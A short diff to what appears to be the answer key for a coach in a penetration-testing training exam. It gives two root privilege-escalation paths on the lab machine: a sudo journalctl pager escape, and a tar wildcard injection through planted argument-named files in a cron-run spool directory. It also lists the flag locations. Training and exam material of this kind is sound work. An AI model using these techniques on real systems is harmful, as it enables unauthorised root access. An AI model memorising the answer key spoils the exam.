@@ -6,8 +6,10 @@ Ground truth for the coach:
 - privesc A: sudo -l → NOPASSWD /usr/bin/journalctl → `sudo journalctl`
   then `!/bin/sh` in the pager
 - privesc B: /etc/cron.d/pentrain-t2-exam — root runs
-  `cd /home/maint/spool && tar czf ... *` every minute → plant
-  --checkpoint=1 + --checkpoint-action=exec=sh /home/maint/pwn.sh
+  `cd /home/maint/spool && tar czf ... *` every minute → in spool plant
+  pwn.sh + `--checkpoint=1` + `--checkpoint-action=exec=sh pwn.sh`
+  (RELATIVE name — filenames can't contain `/`, so `exec=sh /abs/path`
+  is impossible to create)
 - flags: /home/maint/user.txt, /root/root.txt
 
 This is an EXAM — coach at the stage level:
